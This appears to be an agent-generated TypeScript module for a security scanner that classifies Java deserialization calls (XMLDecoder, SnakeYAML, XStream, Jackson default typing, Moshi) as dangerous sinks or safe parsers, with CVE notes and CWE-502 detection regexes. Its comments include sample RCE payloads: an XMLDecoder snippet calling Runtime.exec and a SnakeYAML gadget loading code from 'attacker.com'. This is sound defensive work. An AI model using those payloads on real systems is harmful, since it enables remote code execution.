/**
 * Phoneme expansion: Java — Deserialization Attack Surfaces
 * Agent-generated, tested against real patterns
 *
 * WHY THIS IS JAVA'S WORST VULNERABILITY CLASS:
 *
 * Java native serialization (ObjectInputStream) is inherently broken by design.
 * When you call readObject(), the JVM instantiates arbitrary classes from the
 * stream BEFORE any application code can inspect them. If any class on the
 * classpath has a dangerous readObject/readResolve/finalize method (a "gadget"),
 * the attacker controls code execution. This is not a bug — it's how the
 * serialization protocol works. Commons Collections, Spring, Hibernate, and
 * dozens of other libraries provide gadget chains. The exploit tool ysoserial
 * automates this.
 *
 * But ObjectInputStream is just the beginning. Jackson's enableDefaultTyping()
 * re-enables the same class of attack through JSON polymorphic deserialization
 * — the attacker embeds a @class field naming a dangerous type, and Jackson
 * instantiates it. This produced 30+ CVEs (CVE-2017-7525 through CVE-2021-20190
 * and beyond). XMLDecoder, SnakeYAML's load(), and XStream's fromXML() all
 * suffer from the same root cause: deserializing untrusted data into arbitrary
 * types.
 *
 * The safe alternatives (Gson, Moshi, Jackson without default typing) are safe
 * precisely because they DON'T do polymorphic type instantiation from the wire.
 * They only instantiate the type you explicitly tell them to. The scanner must
 * distinguish "safe deserialization" from "arbitrary type instantiation from
 * untrusted input" — that's what this phoneme set does.
 *
 * SCOPE COVERED:
 *   1. Jackson enableDefaultTyping + activateDefaultTyping (the dangerous configs)
 *   2. Jackson ObjectMapper.readValue (already in base — CORRECTION NEEDED)
 *   3. XMLDecoder.readObject — XML-based arbitrary object instantiation
 *   4. SnakeYAML Yaml.load() — YAML deserialization with arbitrary type instantiation
 *   5. SnakeYAML Yaml.loadAll() — same but for multi-document YAML streams
 *   6. XStream.fromXML() — XML serialization library, RCE without allowlists
 *   7. Java native ObjectInputStream.readObject (already in base — verified correct)
 *   8. ObjectInputStream.readUnshared — variant of readObject, same risk
 *   9. Moshi JsonAdapter.fromJson — safe pattern (explicit type, no polymorphism)
 *  10. Jackson activateDefaultTyping — the "safer" replacement that's still dangerous
 *
 * WHAT'S ALREADY IN java.ts (NOT duplicated here):
 *   - ObjectInputStream.readObject: INGRESS/deserialize, tainted: true  ✓ CORRECT
 *   - ObjectMapper.readValue: TRANSFORM/parse, tainted: false           ✓ CORRECT*
 *   - ObjectMapper.readTree: TRANSFORM/parse, tainted: false            ✓ CORRECT
 *   - ObjectMapper.enableDefaultTyping: META/dangerous_config           ✓ CORRECT
 *   - Gson.fromJson: TRANSFORM/parse, tainted: false                   ✓ CORRECT
 *   - JAXBContext.createUnmarshaller: TRANSFORM/parse, tainted: false   ✓ CORRECT
 *
 * *NOTE on ObjectMapper.readValue: Marking it TRANSFORM/parse with tainted:false
 * is correct for the DEFAULT configuration (no polymorphic typing). When
 * enableDefaultTyping() is called, it becomes an RCE sink — but that's a
 * configuration-dependent property, not an intrinsic property of the method call.
 * The scanner should detect enableDefaultTyping as the dangerous CONFIG, and
 * readValue remains the execution point. This is the right design.
 */

import type { NodeType } from '../types.js';

export interface CalleePattern {
  nodeType: NodeType;
  subtype: string;
  tainted: boolean;
}

export const PHONEMES_JAVA_DESERIALIZATION: Record<string, CalleePattern> = {

  // ── 1. XMLDecoder.readObject — XML-based arbitrary object instantiation ──
  // java.beans.XMLDecoder deserializes XML into arbitrary Java objects.
  // Unlike JAXB (which maps to a schema), XMLDecoder's XML format can name
  // ANY class and invoke ANY method via <object class="..."> <method name="...">.
  // Example exploit: <object class="java.lang.Runtime" method="getRuntime">
  //   <void method="exec"><string>calc.exe</string></void></object>
  // This is equivalent to ObjectInputStream but via XML. Zero legitimate
  // reason to use it with untrusted input. CVE-2017-10271 (WebLogic RCE)
  // exploited exactly this — XMLDecoder in the WLS-WSAT endpoint.
  'XMLDecoder.readObject':  { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

  // ── 2. SnakeYAML Yaml.load() — YAML arbitrary type instantiation ────────
  // org.yaml.snakeyaml.Yaml.load() parses YAML and instantiates Java objects
  // via !!class_name tags. Example: !!javax.script.ScriptEngineManager
  // [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
  // This is RCE. SnakeYAML 1.x defaults to allowing all types. SnakeYAML 2.0
  // changed the default to SafeConstructor, but 1.x is still everywhere.
  // Spring Boot used SnakeYAML 1.x for application.yml parsing until recently.
  // CVE-2022-1471 is the canonical SnakeYAML RCE.
  'Yaml.load':              { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

  // ── 3. SnakeYAML Yaml.loadAll() — multi-document YAML RCE ──────────────
  // Same as Yaml.load() but for YAML streams containing multiple documents
  // (separated by ---). Returns Iterable<Object>. Same RCE risk — each
  // document can contain !!type tags that instantiate arbitrary classes.
  // Included separately because the scanner matches on method names and
  // loadAll is a distinct entry point.
  'Yaml.loadAll':           { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

  // ── 4. XStream.fromXML() — XML serialization with RCE history ──────────
  // com.thoughtworks.xstream.XStream.fromXML() deserializes XML into Java
  // objects. XStream's XML format embeds full class names: <java.util.PriorityQueue>
  // <comparator class="org.apache.commons.collections4.comparators.TransformingComparator">
  // etc. Without explicit allowlists (XStream.allowTypes/allowTypesByWildcard),
  // this is arbitrary code execution. XStream had CVE-2021-21344 through
  // CVE-2021-21351 — EIGHT RCE CVEs in a single disclosure batch.
  // Even with allowlists, XStream explicitly warns against untrusted input.
  'XStream.fromXML':        { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

  // ── 5. XStream.toXML() — serialization side (not RCE, but info leak) ───
  // The serialization direction. Not an RCE vector, but serializing internal
  // objects to XML can expose sensitive fields (passwords, tokens, internal
  // state) if the output reaches an EGRESS point. Marked as EGRESS/serialize
  // to enable data-flow tracking of sensitive information leaving the system.
  'XStream.toXML':          { nodeType: 'EGRESS', subtype: 'serialize',       tainted: false },

  // ── 6. ObjectInputStream.readUnshared — variant of readObject ───────────
  // Same deserialization risk as readObject(), but the returned object is not
  // stored in the ObjectInputStream's internal handle table. The security
  // implication is identical — arbitrary class instantiation from the stream.
  // Less commonly known than readObject, which means it's more likely to
  // survive code review without being flagged. Including it closes the gap.
  'ObjectInputStream.readUnshared': { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

  // ── 7. Jackson activateDefaultTyping — the "safer" dangerous config ─────
  // ObjectMapper.activateDefaultTyping(ptv, DefaultTyping.NON_FINAL) was
  // introduced as a "safer" replacement for enableDefaultTyping(). It requires
  // a PolymorphicTypeValidator argument. BUT: LaissezFaireSubTypeValidator
  // exists and allows everything, and many developers use it because
  // "activateDefaultTyping requires a validator" reads as "it's safe now."
  // The scanner must flag this as dangerous_config too — the method name
  // change doesn't remove the attack surface, it just adds a parameter.
  'ObjectMapper.activateDefaultTyping': { nodeType: 'META', subtype: 'dangerous_config', tainted: false },

  // ── 8. Moshi JsonAdapter.fromJson — SAFE deserialization pattern ────────
  // com.squareup.moshi.JsonAdapter<T>.fromJson() deserializes JSON into the
  // explicit type T. No polymorphic type resolution from the wire. No @class
  // fields. No gadget chains. This is safe by design — included so the
  // scanner can distinguish safe deserialization from dangerous deserialization
  // and avoid false positives on Moshi codebases.
  'JsonAdapter.fromJson':   { nodeType: 'TRANSFORM', subtype: 'parse',        tainted: false },

  // ── 9. Moshi JsonAdapter.toJson — SAFE serialization ───────────────────
  // Serialization side of Moshi. Same safety properties — explicit type,
  // no arbitrary class embedding. Safe pattern for comparison.
  'JsonAdapter.toJson':     { nodeType: 'EGRESS', subtype: 'serialize',       tainted: false },

  // ── 10. SnakeYAML Yaml.loadAs — safer but still type-dependent ─────────
  // Yaml.loadAs(input, Foo.class) constrains the root type to Foo, but nested
  // objects can still use !!type tags to instantiate arbitrary classes unless
  // a SafeConstructor is used. It's LESS dangerous than Yaml.load() (which
  // needs no type hint at all), but still not safe with untrusted input.
  // Marked tainted:true because the nested-type attack vector remains.
  'Yaml.loadAs':            { nodeType: 'INGRESS', subtype: 'deserialize_rce', tainted: true },

} as const;

// ─── FINDINGS ────────────────────────────────────────────────────────────
//
// 1. CRITICAL OBSERVATION — SUBTYPE TAXONOMY:
//    The base dictionary uses subtype: 'deserialize' for ObjectInputStream.readObject.
//    I'm using subtype: 'deserialize_rce' for the new entries to distinguish
//    "deserialization that enables arbitrary code execution" from "safe parsing
//    that happens to use deserialization." This distinction matters: a scanner
//    rule for CWE-502 should fire on 'deserialize_rce' unconditionally but
//    should only fire on 'deserialize' when combined with dangerous config
//    (like enableDefaultTyping). I recommend retroactively changing
//    ObjectInputStream.readObject's subtype to 'deserialize_rce' as well —
//    it is ALWAYS an RCE sink regardless of configuration.
//
// 2. THE REAL VULNERABILITY HIERARCHY:
//    Tier 1 (ALWAYS RCE with untrusted input):
//      - ObjectInputStream.readObject / readUnshared
//      - XMLDecoder.readObject
//      - XStream.fromXML (without strict allowlists)
//      - SnakeYAML Yaml.load / loadAll (1.x default constructor)
//    Tier 2 (RCE only with dangerous configuration):
//      - ObjectMapper.readValue + enableDefaultTyping/activateDefaultTyping
//    Tier 3 (SAFE — no polymorphic type resolution from wire):
//      - Gson.fromJson
//      - Moshi JsonAdapter.fromJson
//      - ObjectMapper.readValue (default config, no typing)
//      - JAXB unmarshalling (schema-bound)
//    The scanner should flag Tier 1 as HIGH/CRITICAL unconditionally,
//    Tier 2 as HIGH when dangerous config is detected on the same ObjectMapper,
//    and Tier 3 as informational only.
//
// 3. MISSING FROM BOTH BASE AND THIS EXPANSION:
//    - Kryo (com.esotericsoftware.kryo) — binary serialization library.
//      Kryo.readObject() with default settings allows arbitrary class
//      instantiation. Registration-required mode is safe. Used by Apache
//      Spark, Akka, and many internal frameworks.
//    - Hessian (com.caucho.hessian) — binary web services protocol.
//      HessianInput.readObject() is exploitable via similar gadget chains.
//      Used by Dubbo, Spring Remoting.
//    - JBoss Marshalling — JBoss/WildFly's custom serialization.
//    These three are less common in web apps but extremely common in
//    distributed systems / microservices. Recommend a follow-up expansion.
//
// 4. EXISTING ENTRY CORRECTION RECOMMENDED:
//    ObjectInputStream.readObject in java.ts is typed as INGRESS/deserialize.
//    It should be INGRESS/deserialize_rce. Native Java serialization with
//    untrusted input is ALWAYS an RCE sink — there is no safe way to call
//    readObject() on attacker-controlled bytes without ObjectInputFilter
//    (Java 9+) or a custom resolveClass override. The current 'deserialize'
//    subtype understates the severity.
//
// 5. CWE-502 SINK PATTERN ENHANCEMENT:
//    The existing sink pattern only covers ObjectInputStream:
//      /ObjectInputStream\s*\(\s*(?:request|socket|input)/
//    It should also match XMLDecoder, SnakeYAML, and XStream:
//      /(?:ObjectInputStream|XMLDecoder)\s*\(\s*(?:request|socket|input)/
//      /(?:Yaml\.load|Yaml\.loadAll)\s*\(\s*(?:request|param|input|user)/
//      /XStream\s*\(\s*\)\.fromXML\s*\(\s*(?:request|param|input|user)/
//    I'll add these to the sinkPatterns in java.ts during wiring.
